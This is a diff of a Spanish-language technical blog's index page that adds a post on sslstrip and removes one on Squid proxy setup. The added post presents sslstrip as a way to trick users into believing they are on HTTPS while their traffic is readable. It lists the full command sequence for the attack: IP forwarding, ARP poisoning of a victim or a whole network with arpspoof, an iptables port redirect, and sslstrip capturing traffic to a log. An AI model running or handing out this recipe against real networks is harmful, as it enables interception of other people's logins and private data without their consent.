@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya &hellip;">
+  <meta name="description" content="Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -75,6 +75,68 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-12-15T18:57:00+01:00" pubdate data-updated="true">15-12-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
+
+<p>Configuración de reenvío de paquetes IP:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Envenenamiento ARP (paquete dsniff):</p>
+
+<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
+
+<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
+
+<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
+
+<p>Redirección de puertos usando Iptables:</p>
+
+<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
+
+<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
+
+<p>Arrancar sslstrip y ponerlo a la escucha:</p>
+
+<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
+
+<p>Visionar en tiempo real los paquetes capturados:</p>
+
+<blockquote><p>#  tail -f archivo.log</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -652,80 +714,6 @@ ForwardX11Trusted yes
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/squid/">Squid</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:57:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Proxy caché (intermediario para nuestra conexion a internet, guardando las paginas visualizadas en una caché)</p>
-
-<blockquote><p># cp /etc/squid3/squid.conf{,.defaults} (Realizar copia de seguridad de la configuración)</p>
-
-<p># nano /etc/squid3/squid.conf</p></blockquote>
-
-<p>Modificamos/adaptamos los siguientes ajustes basicos:</p>
-
-<p>http_port 3128 #puerto de escucha</p>
-
-<p>cache_mem 100 MB #Tamaño memoria caché</p>
-
-<p>cache_dir ufs /var/spool/squid 700 16 256 #directorio y tamaño</p>
-
-<p>acl NuestraRed src 192.168.1.0/24 #Nombre y red a la que afecta</p>
-
-<p>http_access allow NuestraRed #permitir acceso a toda la red</p>
-
-<p>http_access allow deny all #Denegamos a los de fuera de la red</p>
-
-<p>auth_param basic /usr/lib/squid/ncsa_auth /etc/squid/passwd #ruta a usuarios</p>
-
-<p>auth_param basic realm “Mensaje de acceso” #mensaje al logearse</p>
-
-<p>auth_param basic children 5 #Procesos de autentificación</p>
-
-<p>auth_param basic basic credentialsttl 1 hours #tiempo</p>
-
-<blockquote><p># squid3 -k parse (Revisión de la sintaxis del archivo squid.conf)</p></blockquote>
-
-<p>Después de las modificaciones reiniciar servicio:</p>
-
-<blockquote><p># /etc/init.d/squid3 restart</p></blockquote>
-
-<p>Configuración de usuarios (/etc/squid/passwd):</p>
-
-<blockquote><p># htpasswd -c /etc/squid3/passwd user1 (Crear archivo [-c] nombre de usuario y pedirá contraseña)</p>
-
-<p># htpasswd /etc/squid3/passwd usuario2 (Sin parámetro -c porque el archivo ya está creado. Otro usuario y contraseña)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/31/">&larr; Older</a>
@@ -747,6 +735,10 @@ ForwardX11Trusted yes
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/mupdf/">mupdf</a>
+      </li>
     
       <li class="post">
         <a href="/blog/continue/">continue</a>
@@ -782,10 +774,6 @@ ForwardX11Trusted yes
     
       <li class="post">
         <a href="/blog/zmap/">zmap</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zless/">zless</a>
       </li>
     
   </ul>
